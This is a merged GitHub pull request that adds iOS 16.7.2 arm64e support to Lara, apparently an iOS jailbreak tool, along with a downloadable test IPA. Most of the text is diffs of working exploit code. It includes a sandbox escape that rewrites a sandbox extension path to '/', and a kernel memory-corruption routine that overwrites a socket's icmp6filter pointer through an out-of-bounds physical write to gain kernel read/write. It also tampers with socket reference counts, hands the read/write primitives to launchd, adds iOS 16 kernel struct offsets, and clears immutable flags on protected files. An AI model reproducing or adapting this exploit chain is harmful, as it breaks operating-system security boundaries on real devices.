# Add iOS 16.7.2 arm64e support to Lara

> **Repository:** [rooootdev/lara](https://github.com/rooootdev/lara)  
> **Pull Request:** [#264](https://github.com/rooootdev/lara/pull/264)  
> **State:** 🟣 merged  
> **Branch:** `hxhlb:for-ios16` → `rooootdev:main`  
> **Merged by:** [@rooootdev](https://github.com/rooootdev) on May 27, 2026  
> **Changes:** +3767 / -198 across 21 files  
> **Created:** May 23, 2026  
> **Updated:** May 27, 2026  
> **Closed:** May 27, 2026  

---

## Description

*Opened by [@hxhlb](https://github.com/hxhlb)* *on May 23, 2026*


## Summary

This PR adds iOS 16.7.2 support for Lara on the tested arm64e device path.

Included changes:

- Add an iOS 16-specific sandbox escape path
- Add iOS 16 sandbox extension table detection and patching
- Add `K_ios16()` for iOS 16 kernel pointer validation
- Update file operation helpers for the iOS 16 sandbox escape flow
- Add file sharing support in the file manager
- Add iOS 16-specific settings for manual KRW stashing and SpringBoard RemoteCall lifecycle handling
- Add iOS 16.7.2 adaptation for SpringBoard RemoteCall tweaks
- Update MobileGestalt overwrite handling for the iOS 16 sandbox/VFS flow
- Update packaging support for the tested installation flow

## Details

### Sandbox escape

iOS 16 uses a different sandbox extension table layout from the older path. This PR adds a dedicated iOS 16 implementation that:

- Reads the iOS 16 extension table from `sandbox + 0x08`
- Seeds a writable probe extension
- Finds the matching read-write extension in the extension table
- Copies metadata from the container extension
- Patches the probe extension path to `/`
- Verifies the result with real file-system access

The existing sandbox escape flow remains the default path for non-iOS 16 systems. On iOS 16, `sbx_escape()` dispatches into the new iOS 16 implementation.

### File manager

This PR adds a share action to the file manager so files can be exported through the system share sheet.

### iOS 16 settings

This PR adds iOS 16-only settings for:

- Manually stashing KRW to launchd
- Warning that iOS 16 KRW stashing may be unstable and may need to be retried manually
- Keeping the SpringBoard RemoteCall alive while Lara enters the background, with a warning that exiting Lara while RemoteCall is active may respring SpringBoard

### RemoteCall tweaks

This PR includes iOS 16.7.2 adaptation work for SpringBoard RemoteCall tweaks.

The SpringBoard RemoteCall tweak path was tested only partially. The current validation does not cover every tweak action.

### MobileGestalt

MobileGestalt overwrite handling was updated so it works with the iOS 16 sandbox/VFS readiness flow.

### Installation note

On my iPhone XS Max running iOS 16.7.2, direct installation from Xcode did not work in my testing. The IPA should be installed with `ios-deploy` or a similar installation path instead.

This installation limitation is based only on my tested device.

## Demo videos

- Sandbox escape demo: https://github.com/hxhlb/lara/releases/download/ios16.7.2-arm64e-test/1.sandbox.escape.MP4
- SpringBoard RemoteCall demo: https://github.com/hxhlb/lara/releases/download/ios16.7.2-arm64e-test/2.remote.call.MP4

## Test IPA

A test IPA is available from my fork release:

- Release: https://github.com/hxhlb/lara/releases/tag/ios16.7.2-arm64e-test
- IPA: https://github.com/hxhlb/lara/releases/download/ios16.7.2-arm64e-test/lara.ipa

## Testing

Tested locally on:

- iPhone XS Max, iOS 16.7.2

Verified:

- App starts on iOS 16.7.2 through the tested IPA installation flow
- Sandbox escape reports success
- File-system verification passes
- `/private/var/mobile/Library/Preferences` write test passes
- MobileGestalt overwrite flow runs after sandbox/VFS readiness
- File manager sharing is available
- Several SpringBoard RemoteCall tweak actions were tested, but not the full tweak matrix

I only have one iOS 16 device available for testing, so the current validation may be incomplete. More iOS 16 devices should be tested before marking this PR ready for review.


---

## Checks & Status

- Overall: 🟡 **pending**

### Check Runs (2)

- ⚪ [release](https://github.com/rooootdev/lara/actions/runs/26461311430/job/77909904938) — **skipped** — *GitHub Actions*
- ✅ [build](https://github.com/rooootdev/lara/actions/runs/26461311430/job/77909567838) — **success** — *GitHub Actions*


---

## PR Commits (4)

- [`9bd46c4`](https://github.com/rooootdev/lara/commit/9bd46c40954433332205bea08f5e05b77368577d) Add iOS 16 sandbox escape support — *Hades* · May 23, 2026
- [`ff4319b`](https://github.com/rooootdev/lara/commit/ff4319b6459d88a76528ee3df4197fd09e703ae7) Merge branch 'rooootdev:main' into for-ios16 — *Hades* · May 24, 2026
- [`81d31e2`](https://github.com/rooootdev/lara/commit/81d31e2a6a2d4638d476209dd947ba853fd8fcd2) Merge branch 'rooootdev:main' into for-ios16 — *Hades* · May 25, 2026
- [`30522ec`](https://github.com/rooootdev/lara/commit/30522ecc8d669827d1ad41545741687181e5528e) Add iOS 16.7.2 arm64e support — *Hades* · May 26, 2026


---

## Changed Files (21)

- 🟡 `lara/classes/laramgr.swift` (modified) — +83 / -13
  <details><summary>Diff</summary>

  ```diff
  @@ -12,6 +12,44 @@ import notify
 import UIKit
 import WebKit
 
+private func loadMutablePropertyListDictionary(from url: URL) throws -> NSMutableDictionary {
+    let data = try Data(contentsOf: url)
+    var format = PropertyListSerialization.PropertyListFormat.binary
+    let plist = try PropertyListSerialization.propertyList(
+        from: data,
+        options: [.mutableContainersAndLeaves],
+        format: &format
+    )
+    guard let dict = plist as? NSMutableDictionary else {
+        throw "Property list root is not a dictionary."
+    }
+    return dict
+}
+
+private func clearImmutableForOverwriteIfNeeded(path: String) -> String? {
+    let majorVersion = ProcessInfo.processInfo.operatingSystemVersion.majorVersion
+    guard majorVersion == 16 else { return nil }
+
+    let fm = FileManager.default
+    guard let attributes = try? fm.attributesOfItem(atPath: path) else { return nil }
+
+    var updates: [FileAttributeKey: Any] = [:]
+    if (attributes[.immutable] as? NSNumber)?.boolValue == true {
+        updates[.immutable] = false
+    }
+    if (attributes[.appendOnly] as? NSNumber)?.boolValue == true {
+        updates[.appendOnly] = false
+    }
+    guard !updates.isEmpty else { return nil }
+
+    do {
+        try fm.setAttributes(updates, ofItemAtPath: path)
+        return nil
+    } catch {
+        return "clear immutable failed: \(error.localizedDescription)"
+    }
+}
+
 final class laramgr: ObservableObject {
     @Published var log: String = ""
     @Published var hasOffsets: Bool = false
@@ -326,9 +364,11 @@ final class laramgr: ObservableObject {
     }
     
     private func sbxoverwrite(path: String, data: Data) -> (ok: Bool, message: String) {
+        let immutableMessage = clearImmutableForOverwriteIfNeeded(path: path)
         let fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0o644)
         if fd == -1 {
-            return (false, "sbx open failed: errno=\(errno) \(String(cString: strerror(errno)))")
+            let prefix = immutableMessage.map { "\($0), " } ?? ""
+            return (false, "\(prefix)sbx open failed: errno=\(errno) \(String(cString: strerror(errno)))")
         }
         defer { close(fd) }
         
@@ -346,6 +386,10 @@ final class laramgr: ObservableObject {
         if !wroteAll {
             return (false, "sbx write failed: errno=\(errno) \(String(cString: strerror(errno)))")
         }
+
+        if ftruncate(fd, off_t(total)) != 0 {
+            return (false, "sbx truncate failed: errno=\(errno) \(String(cString: strerror(errno)))")
+        }
         
         return (true, "ok (\(total) bytes)")
     }
@@ -577,11 +621,7 @@ final class laramgr: ObservableObject {
             if !fm.fileExists(atPath: path) {
                 if !force { return (false, "file at \(path) does not exist or couldn't be found") }
             } else {
-                if let dictfromplist = NSMutableDictionary(contentsOf: URL(fileURLWithPath: path)) {
-                    dict = dictfromplist
-                } else {
-                    return (false, "could not convert plist at \(path) to readable data")
-                }
+                dict = try loadMutablePropertyListDictionary(from: URL(fileURLWithPath: path))
             }
             if let value = key.value {
                 dict[key.key] = value
@@ -611,14 +651,11 @@ final class laramgr: ObservableObject {
         do {
             let fm = FileManager.default
             if fm.fileExists(atPath: path) {
-                if let dict = NSDictionary(contentsOf: URL(fileURLWithPath: path)) {
-                    if let value = dict[key] {
-                        return (true, "success", value)
-                    } else {
-                        return (false, "key \(key) not found", nil)
-                    }
+                let dict = try loadMutablePropertyListDictionary(from: URL(fileURLWithPath: path))
+                if let value = dict[key] {
+                    return (true, "success", value)
                 } else {
-                    return(false, "could not convert plist at \(path) to readable data", nil)
+                    return (false, "key \(key) not found", nil)
                 }
             } else {
                 return (false, "file at \(path) does not exist or couldn't be found", nil)
@@ -737,6 +774,39 @@ final class laramgr: ObservableObject {
             }
         }
     }
+
+    func stashKRWToLaunchd(completion: ((Bool) -> Void)? = nil) {
+        guard dsready, !rcrunning else {
+            completion?(false)
+            return
+        }
+
+        rcrunning = true
+        rcLastError = nil
+        logmsg("(persist) manually transferring KRW primitives to launchd...")
+
+        DispatchQueue.global(qos: .userInitiated).async { [weak self] in
+            let success = transfer_krw_to_launchd()
+
+            DispatchQueue.main.async {
+                guard let self else { return }
+                self.rcrunning = false
+                if success {
+                    self.rcLastError = nil
+                    self.logmsg("(persist) manual KRW transfer to launchd succeeded")
+                } else {
+                    let error = RemoteCall.lastInitError()
+                    self.rcLastError = error
+                    if let error, !error.isEmpty {
+                        self.logmsg("(persist) manual KRW transfer to launchd failed: \(error)")
+                    } else {
+                        self.logmsg("(persist) manual KRW transfer to launchd failed")
+                    }
+                }
+                completion?(success)
+            }
+        }
+    }
     
     //  params:
     //  - name: function to call
  ```

  </details>
- 🟡 `lara/funcs/fetchkcache.swift` (modified) — +3 / -1
  <details><summary>Diff</summary>

  ```diff
  @@ -19,14 +19,16 @@ func larakcpath() -> String? {
 
 func fetchkcache() -> Bool {
     guard ds_is_ready(),
+          ds_get_our_proc() != 0,
+          ds_get_our_task() != 0,
           off_proc_p_fd != 0,
           off_filedesc_fd_ofiles != 0,
           off_fileproc_fp_glob != 0,
           off_fileglob_fg_data != 0,
           off_vnode_v_data != 0,
           off_namecache_nc_vp != 0,
           off_namecache_nc_child_tqe_next != 0 else {
-        globallogger.log("(fetchkcache) exploit or offsets not ready")
+        globallogger.log("(fetchkcache) exploit, self proc/task, or offsets not ready")
         return false
     }
 
  ```

  </details>
- 🟡 `lara/funcs/helpers.swift` (modified) — +10 / -0
  <details><summary>Diff</summary>

  ```diff
  @@ -12,3 +12,13 @@ func hex(_ value: UInt64) -> String {
 func hex(_ value: UInt32) -> String {
     hex(UInt64(value))
 }
+
+func isIOS16() -> Bool {
+    if #available(iOS 17.0, *) {
+        return false
+    }
+    if #available(iOS 16.0, *) {
+        return true
+    }
+    return false
+}
  ```

  </details>
- 🟡 `lara/funcs/isunsupported.swift` (modified) — +1 / -1
  <details><summary>Diff</summary>

  ```diff
  @@ -32,7 +32,7 @@ func hasmie() -> Bool {
 func isunsupported() -> Bool {
     let v = ProcessInfo.processInfo.operatingSystemVersion
     
-    if v.majorVersion < 17 {
+    if v.majorVersion < 16 {
         return true
     }
     
  ```

  </details>
- 🟡 `lara/kexploit/TaskRop/RemoteCall.h` (modified) — +4 / -0
  <details><summary>Diff</summary>

  ```diff
  @@ -77,6 +77,8 @@ int disable_excguard_kill(uint64_t task);
     uint64_t _secondThreadReturnTrap;
     bool _liveContainerRuntime;
     uint64_t _vmMap;
+    bool _trojanMemIsStackFallback;
+    uint64_t _trojanMemScratchOffset;
     bool _success; // = true;
     //NSMutableArray<NSNumber *> *_threadList = nil;
     //uint64_t _trojanMem;
@@ -86,6 +88,8 @@ int disable_excguard_kill(uint64_t task);
 @property(nonatomic) NSString *lastError;
 @property(nonatomic) NSMutableArray<NSNumber *> *threadList;
 @property(nonatomic) uint64_t trojanMem;
+@property(nonatomic) bool trojanMemIsStackFallback;
+@property(nonatomic) uint64_t trojanMemScratchOffset;
 @property(nonatomic) pid_t pid;
 @property(nonatomic) uint64_t callThreadAddr;
 @property(nonatomic) uint64_t trojanThreadAddr;
  ```

  </details>
- 🟡 `lara/kexploit/TaskRop/RemoteCall.m` (modified) — +2472 / -11
- 🟡 `lara/kexploit/darksword.m` (modified) — +140 / -47
  <details><summary>Diff</summary>

  ```diff
  @@ -31,6 +31,7 @@
 #include <mach/mach_error.h>
 #include <mach-o/dyld.h>
 #include <CoreFoundation/CoreFoundation.h>
+#import <Foundation/Foundation.h>
 #include <limits.h>
 
 extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t,
@@ -78,19 +79,62 @@ static void ds_progress(double progress) {
 }
 
 static void pe_log(const char *fmt, ...) __attribute__((format(printf, 1, 2)));
+static int pe_log_file_fd(void) {
+    static int fd = -2;
+    if (fd != -2) return fd;
+
+    fd = -1;
+    @autoreleasepool {
+        NSArray<NSString *> *dirs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
+        NSString *docs = dirs.firstObject;
+        if (docs.length == 0) return fd;
+
+        NSString *path = [docs stringByAppendingPathComponent:@"lara.log"];
+        fd = open(path.fileSystemRepresentation, O_WRONLY | O_CREAT | O_APPEND, 0644);
+    }
+    return fd;
+}
+
+static void pe_log_file_write(const char *message) {
+    int fd = pe_log_file_fd();
+    if (fd < 0) return;
+
+    char line[1200];
+    int len = snprintf(line, sizeof(line), "(ds) %s\n", message);
+    if (len <= 0) return;
+    if (len >= (int)sizeof(line)) len = (int)sizeof(line) - 1;
+    write(fd, line, (size_t)len);
+    fsync(fd);
+}
+
 static void pe_log(const char *fmt, ...) {
     char buf[1024];
     va_list ap;
     va_start(ap, fmt);
     vsnprintf(buf, sizeof(buf), fmt, ap);
     va_end(ap);
+    pe_log_file_write(buf);
     if (g_log_callback) g_log_callback(buf);
     else printf("(pe) %s\n", buf);
 }
 
 #define uwrite64(a, v)  (*(volatile uint64_t *)(uintptr_t)(a) = (uint64_t)(v))
 #define uread64(a)      (*(volatile uint64_t *)(uintptr_t)(a))
 
+static void *reverse_memmem(const void *haystack, size_t haystack_len, const void *needle, size_t needle_len) {
+    if (needle_len == 0) return (void *)haystack;
+    if (haystack_len < needle_len) return NULL;
+
+    const char *h = (const char *)haystack;
+    const char *n = (const char *)needle;
+    for (size_t i = haystack_len - needle_len + 1; i-- > 0;) {
+        if (memcmp(h + i, n, needle_len) == 0) {
+            return (void *)(h + i);
+        }
+    }
+    return NULL;
+}
+
 static void cmp8_wait_for_change(volatile uint64_t *ptr, uint64_t old_val) {
     while (*ptr == old_val) ;
 }
@@ -649,10 +693,11 @@ static int64_t find_and_corrupt_socket(mach_port_t memory_object, uint64_t seeki
 
     bool target_found = false;
     uint64_t pcb_start_offset = 0;
-    uint64_t icmp6filt_offset = 0x148;
+    uint64_t icmp6filt_offset = off_inpcb_inp_depend6_inp6_icmp6filt;
+    uint64_t corrupted_filter_marker = 0x0000ffffffffffffULL;
     const char *matched_marker = NULL;
 
-    for (uint64_t search_start_idx = 0; search_start_idx < oob_size; search_start_idx += 0x400) {
+    for (uint64_t search_start_idx = 0; search_start_idx < oob_size;) {
         // ---- progress 0.51 → 0.59 stable scan phase ----
         static uint64_t last_progress_step = 0;
 
@@ -694,12 +739,22 @@ static int64_t find_and_corrupt_socket(mach_port_t memory_object, uint64_t seeki
             break;
         }
 
-        pcb_start_offset = ((uint64_t)((uint8_t *)best_found - (uint8_t *)read_buffer)) & 0xFFFFFFFFFFFFFC00ULL;
-        if (*(uint64_t *)((uint8_t *)read_buffer + pcb_start_offset + icmp6filt_offset + 8) == 0x0000ffffffffffffULL) {
-            matched_marker = best_marker;
-            target_found = true;
-            break;
+        uint64_t found_offset = (uint8_t *)best_found - (uint8_t *)read_buffer;
+        void *filter_found = reverse_memmem(read_buffer, found_offset, &corrupted_filter_marker, sizeof(corrupted_filter_marker));
+        if (filter_found != NULL) {
+            uint64_t filter_offset = (uint8_t *)filter_found - (uint8_t *)read_buffer;
+            if (filter_offset >= icmp6filt_offset + 0x8) {
+                uint64_t candidate_pcb_start_offset = filter_offset - (icmp6filt_offset + 0x8);
+                if (candidate_pcb_start_offset + icmp6filt_offset + 0x10 <= oob_size) {
+                    pcb_start_offset = candidate_pcb_start_offset;
+                    matched_marker = best_marker;
+                    target_found = true;
+                    break;
+                }
+            }
         }
+
+        search_start_idx = found_offset + 1;
     }
 
     if (target_found) {
@@ -734,7 +789,7 @@ static int64_t find_and_corrupt_socket(mach_port_t memory_object, uint64_t seeki
         }
         target_inp_gencnt_list[target_inp_gencnt_count++] = target_inp_gencnt;
 
-        uint64_t inp_list_next_pointer = *(uint64_t *)((uint8_t *)read_buffer + pcb_start_offset + 0x28) - 0x20;
+        uint64_t inp_list_next_pointer = *(uint64_t *)((uint8_t *)read_buffer + pcb_start_offset + off_inpcb_inp_list_le_next + 0x8) - off_inpcb_inp_list_le_next;
         uint64_t icmp6filter = *(uint64_t *)((uint8_t *)read_buffer + pcb_start_offset + icmp6filt_offset);
         pe_log("inp_list_next_pointer: 0x%llx", inp_list_next_pointer);
         pe_log("icmp6filter: 0x%llx", icmp6filter);
@@ -746,14 +801,30 @@ static int64_t find_and_corrupt_socket(mach_port_t memory_object, uint64_t seeki
         *(uint64_t *)((uint8_t *)write_buffer + pcb_start_offset + icmp6filt_offset + 8) = 0;
 
         pe_log("corrupting icmp6filter pointer...");
+        uint64_t corrupt_attempt = 0;
         while (true) {
+            if (corrupt_attempt < 8 || (corrupt_attempt % 16) == 0) {
+                pe_log("corrupt attempt %llu: write target=0x%llx value=0x%llx",
+                       corrupt_attempt,
+                       (uint64_t)(seeking_offset + oob_offset + pcb_start_offset + icmp6filt_offset),
+                       inp_list_next_pointer + icmp6filt_offset);
+            }
             physical_oob_write_mo(memory_object, seeking_offset, oob_size, oob_offset, write_buffer);
+            if (corrupt_attempt < 8 || (corrupt_attempt % 16) == 0) {
+                pe_log("corrupt attempt %llu: write returned", corrupt_attempt);
+            }
             physical_oob_read_mo_with_retry(memory_object, seeking_offset, oob_size, oob_offset, read_buffer);
             uint64_t new_icmp6filter = *(uint64_t *)((uint8_t *)read_buffer + pcb_start_offset + icmp6filt_offset);
+            if (corrupt_attempt < 8 || (corrupt_attempt % 16) == 0) {
+                pe_log("corrupt attempt %llu: read new_icmp6filter=0x%llx",
+                       corrupt_attempt,
+                       new_icmp6filter);
+            }
             if (new_icmp6filter == inp_list_next_pointer + icmp6filt_offset) {
                 pe_log("target corrupted: 0x%llx", new_icmp6filter);
                 break;
             }
+            corrupt_attempt++;
         }
 
         int sock = fileport_makefd(socket_ports[control_socket_idx]);
@@ -774,43 +845,34 @@ static int64_t find_and_corrupt_socket(mach_port_t memory_object, uint64_t seeki
     return -1;
 }
 
-static int get_ios_major_version(void) {
-    char buf[256] = {0};
-    size_t len = sizeof(buf);
-    sysctlbyname("kern.osversion", buf, &len, NULL, 0);
-    int build = atoi(buf);
-    if (build >= 23) return 26;
-    if (build >= 22) return 18;
-    if (build >= 21) return 17;
-    return 18;
-}
-
 static void krw_sockets_leak_forever(void) {
-    uint64_t offset_pcb_socket = 0x40;
-    int ios_ver = get_ios_major_version();
-    uint64_t offset_socket_so_count;
-    switch (ios_ver) {
-        case 17: offset_socket_so_count = 0x24c; break;
-        case 26: offset_socket_so_count = 0x23c; break;
-        default: offset_socket_so_count = 0x254; break;
-    }
-    pe_log("iOS %d: using so_count offset 0x%llx", ios_ver, offset_socket_so_count);
+    pe_log("krw leak: control_socket_pcb=0x%llx rw_socket_pcb=0x%llx", control_socket_pcb, rw_socket_pcb);
 
-    uint64_t control_socket_addr = early_kread64(control_socket_pcb + offset_pcb_socket);
-    uint64_t rw_socket_addr      = early_kread64(rw_socket_pcb + offset_pcb_socket);
+    uint64_t control_socket_addr = early_kread64(control_socket_pcb + off_inpcb_inp_socket);
+    uint64_t rw_socket_addr      = early_kread64(rw_socket_pcb + off_inpcb_inp_socket);
+    pe_log("krw leak: control_socket_addr=0x%llx rw_socket_addr=0x%llx", control_socket_addr, rw_socket_addr);
     if (!control_socket_addr || !rw_socket_addr) {
         pe_log("couldn't find control_socket_addr || rw_socket_addr");
         return;
     }
-    uint64_t control_socket_so_count = early_kread64(control_socket_addr + offset_socket_so_count);
-    uint64_t rw_socket_so_count      = early_kread64(rw_socket_addr + offset_socket_so_count);
-    early_kwrite64(control_socket_addr + offset_socket_so_count,
+    uint64_t control_socket_so_count = early_kread64(control_socket_addr + off_socket_so_usecount);
+    uint64_t rw_socket_so_count      = early_kread64(rw_socket_addr + off_socket_so_usecount);
+    pe_log("krw leak: control_socket_so_count=0x%llx rw_socket_so_count=0x%llx", control_socket_so_count, rw_socket_so_count);
+    early_kwrite64(control_socket_addr + off_socket_so_usecount,
                    control_socket_so_count + 0x0000100100001001ULL);
-    early_kwrite64(rw_socket_addr + offset_socket_so_count,
+    early_kwrite64(rw_socket_addr + off_socket_so_usecount,
                    rw_socket_so_count + 0x0000100100001001ULL);
 
-    uint64_t icmp6filt_offset = 0x148;
-    early_kwrite64(rw_socket_pcb + icmp6filt_offset + 8, 0);
+    early_kwrite64(rw_socket_pcb + off_inpcb_inp_depend6_inp6_icmp6filt + 8, 0);
+}
+
+static int get_darwin_major_version(void) {
+    char osrelease[64] = {0};
+    size_t len = sizeof(osrelease);
+    if (sysctlbyname("kern.osrelease", osrelease, &len, NULL, 0) != 0) {
+        return 0;
+    }
+    return atoi(osrelease);
 }
 
 static void pe_init(void) {
@@ -1184,17 +1246,31 @@ static int pe(void) {
     ds_progresssafe(0.80);
     pe_log("walking kernel structures...");
 
-    control_socket_pcb = early_kread64(rw_socket_pcb + 0x20);
-    uint64_t pcbinfo_pointer = early_kread64(control_socket_pcb + 0x38);
-    uint64_t ipi_zone = early_kread64(pcbinfo_pointer + 0x68);
-    uint64_t zv_name = early_kread64(ipi_zone + 0x10);
-
+    control_socket_pcb = early_kread64(rw_socket_pcb + off_inpcb_inp_list_le_next);
     pe_log("control_socket_pcb: 0x%llx", control_socket_pcb);
-    pe_log("pcbinfo_pointer: 0x%llx", pcbinfo_pointer);
-    pe_log("ipi_zone: 0x%llx", ipi_zone);
-    pe_log("zv_name: 0x%llx", zv_name);
 
-    kernel_base = zv_name & 0xFFFFFFFFFFFFC000ULL;
+    uint64_t text_ptr = 0;
+    if (get_darwin_major_version() >= 23) {
+        uint64_t pcbinfo_pointer = early_kread64(control_socket_pcb + off_inpcb_inp_pcbinfo);
+        uint64_t ipi_zone = early_kread64(pcbinfo_pointer + off_inpcbinfo_ipi_zone);
+        text_ptr = early_kread64(ipi_zone + off_kalloc_type_view_kt_zv_zv_name);
+
+        pe_log("pcbinfo_pointer: 0x%llx", pcbinfo_pointer);
+        pe_log("ipi_zone: 0x%llx", ipi_zone);
+        pe_log("zv_name: 0x%llx", text_ptr);
+    } else {
+        uint64_t socket_ptr = early_kread64(control_socket_pcb + off_inpcb_inp_socket);
+        uint64_t proto_ptr = early_kread64(socket_ptr + off_socket_so_proto);
+        uint64_t raw_text_ptr = early_kread64(proto_ptr + off_protosw_pr_input);
+        text_ptr = xpaci(raw_text_ptr);
+
+        pe_log("socket_ptr: 0x%llx", socket_ptr);
+        pe_log("proto_ptr: 0x%llx", proto_ptr);
+        pe_log("raw_text_ptr: 0x%llx", raw_text_ptr);
+        pe_log("text_ptr: 0x%llx", text_ptr);
+    }
+
+    kernel_base = text_ptr & 0xFFFFFFFFFFFFC000ULL;
     pe_log("searching for kernel mach-o header from 0x%llx...", kernel_base);
     int search_iters = 0;
     uint64_t fallback_execute_base = 0;
@@ -1270,13 +1346,25 @@ static int pe(void) {
     ds_progresssafe(0.99);
     
     our_proc = proc_self();
+    if (!our_proc) {
+        pe_log("our_proc lookup failed");
+        return 0;
+    }
     our_task = task_self();
+    if (!our_task) {
+        pe_log("our_task lookup failed");
+        return 0;
+    }
     
     pe_log("our_proc: 0x%llx", our_proc);
     pe_log("our_task: 0x%llx", our_task);
     if (stashkrw()) {
         pe_log("transferring primitives to launchd...");
-        transfer_krw_to_launchd();
+        if (transfer_krw_to_launchd()) {
+            pe_log("transferred primitives to launchd");
+        } else {
+            pe_log("failed to transfer primitives to launchd");
+        }
     }
     return 0;
 }
@@ -1293,6 +1381,11 @@ int ds_run(void) {
         *(uint64_t *)(default_file_content + i) = random_marker;
 
     pe_log("starting darksword");
+    pe_log("offsets: inpcb.icmp6filt=0x%x socket.usecount=0x%x socket.proto=0x%x protosw.input=0x%x",
+           off_inpcb_inp_depend6_inp6_icmp6filt,
+           off_socket_so_usecount,
+           off_socket_so_proto,
+           off_protosw_pr_input);
     int result = pe();
     if (result != 0) {
         ds_progresssafe(0.99);
@@ -1498,7 +1591,7 @@ uint64_t ds_kallocarrdec(uint64_t ptr) {
 }
 
 uint64_t ds_get_pcbinfo(void) {
-    return early_kread64(control_socket_pcb + 0x38);
+    return early_kread64(control_socket_pcb + off_inpcb_inp_pcbinfo);
 }
 
 uint64_t ds_get_rw_socket_pcb(void) {
  ```

  </details>
- 🟡 `lara/kexploit/offsets.h` (modified) — +1 / -0
  <details><summary>Diff</summary>

  ```diff
  @@ -27,6 +27,7 @@ extern uint32_t off_inpcb_inp_depend6_inp6_chksum;
 extern uint32_t off_socket_so_usecount;
 extern uint32_t off_socket_so_proto;
 extern uint32_t off_socket_so_background_thread;
+extern uint32_t off_protosw_pr_input;
 extern uint32_t off_kalloc_type_view_kt_zv_zv_name;
 extern uint32_t off_thread_t_tro;
 extern uint32_t off_thread_ro_tro_proc;
  ```

  </details>
- 🟡 `lara/kexploit/offsets.m` (modified) — +31 / -9
  <details><summary>Diff</summary>

  ```diff
  @@ -22,6 +22,7 @@
 #define SYSTEM_VERSION_LESS_THAN(v) ([[[UIDevice currentDevice] systemVersion] compare:v options:NSNumericSearch] == NSOrderedAscending)
 
 static NSString *const kkernprockey   = @"lara.kernprocoff";
+static NSString *const kallprockey    = @"lara.allprocoff";
 static NSString *const krootvnodekey  = @"lara.rootvnodeoff";
 static NSString *const kkerncachekey  = @"lara.kernelcache_path";
 static NSString *const kkernprocsize  = @"lara.kernproc_size";
@@ -36,6 +37,7 @@
 uint32_t off_socket_so_usecount = 0;
 uint32_t off_socket_so_proto = 0;
 uint32_t off_socket_so_background_thread = 0;
+uint32_t off_protosw_pr_input = 0;
 uint32_t off_kalloc_type_view_kt_zv_zv_name = 0;
 uint32_t off_thread_t_tro = 0;
 uint32_t off_thread_ro_tro_proc = 0;
@@ -136,6 +138,7 @@
     OFFSET32(off_socket_so_usecount),
     OFFSET32(off_socket_so_proto),
     OFFSET32(off_socket_so_background_thread),
+    OFFSET32(off_protosw_pr_input),
     OFFSET32(off_kalloc_type_view_kt_zv_zv_name),
     OFFSET32(off_thread_t_tro),
     OFFSET32(off_thread_ro_tro_proc),
@@ -430,7 +433,7 @@ bool resolvekernoffsets(NSString *kcpath) {
         return false;
     }
 
-    uint64_t allprocoff = allproc - gXPF.kernelBase;
+    uint64_t allprocoff = allproc ? allproc - gXPF.kernelBase : 0;
     uint64_t kernprocoff = kernproc - gXPF.kernelBase;
     uint64_t rootvnodeoff = rootvnode - gXPF.kernelBase;
 
@@ -443,6 +446,9 @@ bool resolvekernoffsets(NSString *kcpath) {
     NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
 
     [defaults setObject:@(kernprocoff) forKey:kkernprockey];
+    if (allprocoff) {
+        [defaults setObject:@(allprocoff) forKey:kallprockey];
+    }
     [defaults setObject:@(rootvnodeoff) forKey:krootvnodekey];
     [defaults setObject:@(procsize) forKey:kkernprocsize];
     [defaults setObject:kcpath forKey:kkerncachekey];
@@ -543,8 +549,8 @@ static bool is_known_a_series_ipad_identifier(void) {
 }
 
 void offsets_init(void) {
-    if (!(SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(@"17.0") && SYSTEM_VERSION_LESS_THAN(@"26.1"))) {
-        printf("(offs) only supported offset for iOS 17.0 - 26.0.x\n");
+    if (!(SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(@"16.0") && SYSTEM_VERSION_LESS_THAN(@"26.1"))) {
+        printf("(offs) only supported offset for iOS 16.0 - 26.0.x\n");
         exit(EXIT_FAILURE);
     }
     
@@ -596,7 +602,8 @@ void offsets_init(void) {
     
     gIsPACSupported = is_pac_supported();
     
-    if (SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(@"17.0")) {
+    if (SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(@"16.0")) {
+        bool isIOS16 = SYSTEM_VERSION_LESS_THAN(@"17.0");
         off_inpcb_inp_list_le_next = 0x20;
         off_inpcb_inp_pcbinfo = 0x38;
         off_inpcb_inp_socket = 0x40;
@@ -606,9 +613,10 @@ void offsets_init(void) {
         off_socket_so_usecount = 0x22c;
         off_socket_so_proto = 0x18;
         off_socket_so_background_thread = 0x288;
+        off_protosw_pr_input = 0x28;
         off_kalloc_type_view_kt_zv_zv_name = 0x10;
-        off_thread_ro_tro_proc = 0x10;
-        off_thread_ro_tro_task = 0x20;
+        off_thread_ro_tro_proc = isIOS16 ? 0x18 : 0x10;
+        off_thread_ro_tro_task = isIOS16 ? 0x28 : 0x20;
         off_thread_machine_upcb = 0xb0;
         off_thread_machine_contextdata = 0xb0-8;
         off_thread_t_tro = 0x358;
@@ -621,13 +629,26 @@ void offsets_init(void) {
         off_thread_guard_exc_info_code = 0x308;
         off_thread_ast = 0x37c;
         off_thread_task_threads_next = 0x348;
+        if (isIOS16) {
+            off_thread_ro_tro_proc = 0x10;
+            off_thread_ro_tro_task = 0x20;
+            off_thread_t_tro = 0x360;
+            off_thread_mutex_lck_mtx_data = 0x390;
+            off_thread_ast = 0x334;
+            off_thread_task_threads_next = 0x350;
+        }
         off_proc_p_list_le_next = 0x0;
         off_proc_p_list_le_prev = 0x8;
         off_proc_p_proc_ro = 0x18;
         off_proc_p_pid = 0x60;
-        off_proc_p_fd = 0xd0;
-        off_proc_p_flag = 0x454;
-        off_proc_p_textvp = 0x548;
+        off_proc_p_fd = isIOS16 ? 0xd8 : 0xd0;
+        if (!isIOS16 || SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(@"16.4")) {
+            off_proc_p_flag = 0x454;
+            off_proc_p_textvp = 0x548;
+        } else {
+            off_proc_p_flag = 0x25c;
+            off_proc_p_textvp = 0x350;
+        }
         off_proc_p_name = 0x579;
         off_proc_ro_pr_task = 0x8;
         off_proc_ro_p_ucred = 0x20;
@@ -1422,6 +1443,7 @@ void clearkerncachedata(void) {
 
     [defaults removeObjectForKey:kkerncachekey];
     [defaults removeObjectForKey:kkernprockey];
+    [defaults removeObjectForKey:kallprockey];
